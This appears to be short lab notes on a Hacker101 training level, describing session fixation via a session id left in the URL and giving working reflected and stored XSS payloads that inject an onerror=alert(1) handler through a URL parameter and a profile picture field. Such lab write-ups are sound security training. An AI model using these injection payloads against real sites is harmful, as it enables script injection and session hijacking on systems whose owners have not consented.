CSRF token: 2e2e2e4e6f7420746869732074696d65211808b80519cd115442a14554536ac6ea

## Session fixation

The Session id is clearly visible in the url and is not changed upon different sessions. One can connect to this session if he knows the session id.


## Reflected XSS

The following will triger a reflected XSS

    https://levels-a.hacker101.com/levels/2/?id=%3Cimg%20src=toto%20onerror=alert(1)%3E

## Stored XSS

The following will triger a stored XSS

Go to "Edit profile" > Profile picture URL and type something like:

    XSS" onerror=alert(1)
